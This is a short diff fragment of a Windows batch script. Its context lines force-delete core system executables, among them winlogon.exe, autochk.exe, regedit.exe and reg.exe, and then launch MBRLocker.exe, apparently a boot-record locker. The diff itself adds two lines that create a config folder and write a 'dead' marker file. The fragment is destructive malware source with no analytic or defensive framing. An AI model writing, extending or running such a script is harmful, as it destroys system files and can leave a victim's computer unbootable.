@@ -80,6 +80,8 @@ del winlogon.exe /f
 del autochk.exe /f
 del ..\regedit.exe /f
 del reg.exe /f
+md config
+echo dead>config\OSDATA
 cd %userprofile%\Desktop
 MBRLocker.exe
 timeout /t 15 /nobreak
